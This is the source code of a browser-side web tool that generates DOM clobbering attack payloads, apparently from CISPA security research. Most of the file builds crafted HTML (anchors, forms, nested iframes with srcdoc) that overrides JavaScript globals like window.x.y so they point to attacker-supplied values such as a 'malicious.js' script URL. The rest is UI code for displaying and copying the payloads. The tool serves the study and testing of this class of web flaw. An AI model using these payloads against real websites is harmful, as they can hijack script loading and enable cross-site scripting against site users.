
/*
    Copyright (C) 2022  Soheil Khodayari, CISPA
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.
    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.


    Description:
    ------------
    HTML Payload Generation for Clobbering DOMC Sources
*/



/**
 * DOMClobberingPayloadGenerator
 * @constructor
 */
function DOMClobberingPayloadGenerator() {
    "use strict";
}


/**
 * create_dom_clobbering_html_payload(statement)
 * @param statement: {
 *		"clobbering_target": "window.x.y",
 *		"clobbering_value": "malicious.js"
 *	}
 */
DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = function (statement){


	let output = [];
	

	const clobbering_value = statement.clobbering_value;
	const code_targets = statement.clobbering_target.split('.');

	if(code_targets.length === 0){
		return output;
	}


	const chainIframes = function(clobbering_target, n){
        if (clobbering_target.length - 1 === n){
            return `<a id='${clobbering_target[n]}'${clobbering_value ? ` href='${clobbering_value}'` : ''}></a>`
        }

        let html = `<iframe name=${clobbering_target[n]} srcdoc="\n${"  ".repeat(n + 1) + chainIframes(clobbering_target, n + 1) + "\n" + "  ".repeat(n)}"></iframe>`;

        if (n === 1) html = html.replace(/"/g, '&quot;')
        else if (n > 1) html = html.replace(/"/g, '&quot;').replace(/&/g, "&amp;");

        return html;
    }

 	// ---------------------------
	// CASE 1: window.X OR X
	// ---------------------------
	if(code_targets[0] !== 'document')
	{

		if(code_targets[0] !== 'window')
		{
			// add the window object to the beginning to 
			// handle both the case of `window.x.y` and `x.y` together 
			code_targets.unshift('window');
		}
		const code_targets_length = code_targets.length;

		if(code_targets_length === 1){
			// cannot clobber window alone;
			const payload = "Warning: the global `window` object of type WindowProxy cannot be clobbered!"; 
			output.push(payload);
		}
		else if(code_targets_length === 2)
		{
			// CASE 1.1: window.x
			output = output.concat([
				`<a id="${code_targets[1]}" href="${clobbering_value}"></a>`,
				`<customtag id="${code_targets[1]}"></customtag>`,
				`<article id="${code_targets[1]}"></article>`,
				`<iframe name="${code_targets[1]}"></iframe>`,
				`<base id="${code_targets[1]}"></base>`,
				`<aside id="${code_targets[1]}"></aside>`,
				`<audio id="${code_targets[1]}"></audio>`,
				`<b id="${code_targets[1]}"></b>`,
			]);


		}
		else if(code_targets_length === 3)
		{
			// CASE 1.2: window.x.y
			output = output.concat([
				`<a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
				`<form id="${code_targets[1]}"><input id="${code_targets[2]}"/> </form>`,
				`<form id="${code_targets[1]}"><button id="${code_targets[2]}"/> </form>`,
				`<form id="${code_targets[1]}"><img id="${code_targets[2]}" src="${clobbering_value}" /> </form>`,
				`<form name="${code_targets[1]}"><textarea name="${code_targets[2]}" /> </form>`,
			]);


		}

		else if(code_targets_length === 4 && code_targets[3] === 'src')
		{
			// CASE 1.3: window.x.y.src
			output = output.concat([
				`<video id="${code_targets[1]}"></video><video id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></video>`,
				`<audio id="${code_targets[1]}"></audio><audio id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></audio>`,
				`<embed id="${code_targets[1]}"></embed><embed id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}"></embed>`,
				`<form id="${code_targets[1]}"><img id="${code_targets[2]}" src="${clobbering_value}" /> </form>`,
				`<form id="${code_targets[1]}"><object id="${code_targets[2]}" data="${clobbering_value}" /> </form>`,

			]);


		}
		
		else if(code_targets_length === 4 && code_targets[3] === 'value')
		{
			// CASE 1.4: window.x.y.value
			output = output.concat([
				`<form id="${code_targets[1]}"><input type="text" id="${code_targets[2]}" value="${clobbering_value}"/></form>`,
				`<form id="${code_targets[1]}"><output id="${code_targets[2]}">${clobbering_value}</output></form>`,
				`<form id="${code_targets[1]}"><textarea id="${code_targets[2]}" value="${clobbering_value}"/></form>`,
				`<form id="${code_targets[1]}"><object id="${code_targets[2]}" value="${clobbering_value}" data="${clobbering_value}" /></form>`,
			]);


		}
		
		else if(code_targets_length === 4 && code_targets[3] === 'href')
		{
			// CASE 1.5: window.x.y.href
			output = output.concat([
				`<a id="${code_targets[1]}"></a><a id="${code_targets[1]}" name="${code_targets[2]}" href="${clobbering_value}"></a>`,
				`<form id="${code_targets[1]}">\n<form id="${code_targets[1]}" name="${code_targets[2]}">\n  <input name="${code_targets[3]}">\n</form>`,
				chainIframes(code_targets, 0),
			]);

		}
		
		else if (code_targets_length === 4) 
		{
			// CASE 1.6: window.x.y.z
			output = output.concat([
				`<form id="${code_targets[1]}">\n<form id="${code_targets[1]}" name="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`,
				chainIframes(code_targets, 0),
			]);


		}
		
		else if (code_targets_length === 5) 
		{
			// CASE 1.7: window.x.y.z.w
			let last_src_doc = `<a id=${code_targets[code_targets_length-2]}></a><a id=${code_targets[code_targets_length-2]} name=${code_targets[code_targets_length-1]} href=${clobbering_value}></a>`;
			let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
			output = output.concat([payload]);


		}
		
		else if (code_targets_length === 6 && code_targets[5] === 'href') 
		{
			// CASE 1.8: window.x.y.z.w.href
			let last_src_doc = `<a id=${code_targets[code_targets_length-2]}></a><a id=${code_targets[code_targets_length-2]} name=${code_targets[code_targets_length-1]} href=${clobbering_value}></a>`;
			let payload = `<iframe name="${code_targets[1]}" srcdoc="<iframe name='${code_targets[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
			output = output.concat([payload]);
		}
		
		else
		{
			// CASE 1.9: for higher levels, recursively chain iframes to create nested frames of length n
			let payload=chainIframes(code_targets, 0);
			output = output.concat([payload]);
		}
		

	} 
	// ---------------------------
	// CASE 2: document.X 
	// ---------------------------
	else
	{
		const code_targets_length = code_targets.length;
		if(code_targets_length === 1){
			// cannot clobber document object alone;
			const payload = "Warning: the global `document` object cannot be clobbered!"; 
			output = output.concat([payload]);
		}

		else if(code_targets_length === 2){

			// CASE 2.1: document.x
			output = output.concat([
				`<embed name="${code_targets[1]}" src="${clobbering_value}"></embed>`,
				`<img name="${code_targets[1]}" src="${clobbering_value}"></img>`,
				`<object id="${code_targets[1]}" data="${clobbering_value}"></object>`,
				`<form name="${code_targets[1]}"></form>`,
				`<iframe name="${code_targets[1]}"></iframe>`,
			]);			
		}

		else if(code_targets_length === 3){

			// CASE 2.2: document.x.y
			output = output.concat([
				`<form name="${code_targets[1]}"></form> <form name="${code_targets[1]}" id="${code_targets[2]}"></form>`,
				`<form name="${code_targets[1]}"><img name="${code_targets[2]}" src="${clobbering_value}"></form>`,
				`<form name="${code_targets[1]}"><output name="${code_targets[2]}"> ${clobbering_value} </output></form>`,
				`<object id=${code_targets[1]}><img id="${code_targets[1]}" name="${code_targets[2]}" src="${clobbering_value}" /></object>`,

			]);			
		}	
		
		else if(code_targets_length === 4){

			// CASE 2.3: document.x.y.z
			output = output.concat([
				`<form id="${code_targets[1]}">\n<form id="${code_targets[1]}" name="${code_targets[2]}">\n <input name="${code_targets[3]}" value="${clobbering_value}">\n</form>`,
				chainIframes(code_targets, 0),
			]);

		}

		else{
			// CASE 2.4: higher levels
			let payload=chainIframes(code_targets, 0);
			output = output.concat([payload]);
		}

	}

	return output;
}

/*
 *	glue code for payload generation
 */

function get_bootstrap_color_class(i) {

	/* pick a random color */
	let idx = i % 8;
	var choices = ['primary', 'success', 'warning', 'danger', 'secondary', 'info', 'warning', 'dark'];
	return choices[idx];

 	/* always return the same color */
 	// return 'primary'
}


function sanitize(markup) {
    return markup.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')
}


function copyToClipboard(elem, copied_banner) {
	var range = document.createRange();
	range.selectNode(elem);
	window.getSelection().removeAllRanges(); // clear current selection
	window.getSelection().addRange(range); // to select text
	document.execCommand("copy");
	window.getSelection().removeAllRanges();// to deselect

  $(copied_banner).show().animate({ top: -25, opacity: 0 }, 700, function() {
    $(this).css({ top: 0, opacity: 1 }).hide();
  });
    

}

const payload_generator = new DOMClobberingPayloadGenerator();
const submit_button = document.getElementById('clobbering-sumbit');
const results_container = document.getElementById('clobbering-result');

submit_button.addEventListener('click', (e)=> {
	e.preventDefault();

	var clobbering_target = document.getElementById('clobbering-target').value.trim();
	var clobbering_value = document.getElementById('clobbering-value').value.trim();

	if(clobbering_target === ''){
		results_container.innerHTML = 'Warning: DOM clobbering target is empty, please specify a target to clobber.'
	}
	if(clobbering_value === ''){
		clobbering_value = 'clobbered';
	}

	var outputs = payload_generator.create_dom_clobbering_html_payload({
		"clobbering_target": clobbering_target,
		"clobbering_value": clobbering_value
	});

	results_container.innerHTML = outputs.map((markup, idx) => 
		`<div class="mb-2 alert alert-${get_bootstrap_color_class(idx)}" role="alert">
		 	<span>${sanitize(markup)}</span> 
		 	<span class="input-group-addon btn copy-btn" title="Click to copy"><i class="fa fa-clipboard" aria-hidden="true"></i></span>
		 	<span class="copied">Copied!</span>
		 </div> `).join('');

});


$("#clobbering-result").on("click", ".copy-btn", function(e) {
    let input = e.target.closest('div').firstChild.nextSibling;
    let copied_banner = e.target.closest('span').nextSibling.nextSibling;
    copyToClipboard(input, copied_banner);
});






